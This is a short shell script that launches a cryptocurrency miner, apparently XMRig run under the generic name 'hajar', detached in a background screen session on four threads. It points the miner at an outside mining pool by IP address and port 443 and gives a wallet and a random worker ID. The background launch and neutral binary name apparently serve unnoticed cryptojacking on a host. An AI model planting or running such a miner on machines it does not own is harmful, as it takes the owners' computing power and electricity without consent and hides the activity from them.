POOL=208.113.200.73:443

WALLET=THISPC

WORKER=$(echo $(shuf -i 1-10000 -n 1))

chmod +x hajar

screen -dmS run ./hajar --donate-level 1 -o $POOL -u $WALLET.$WORKER -p x -k -a rx/0 -t 4
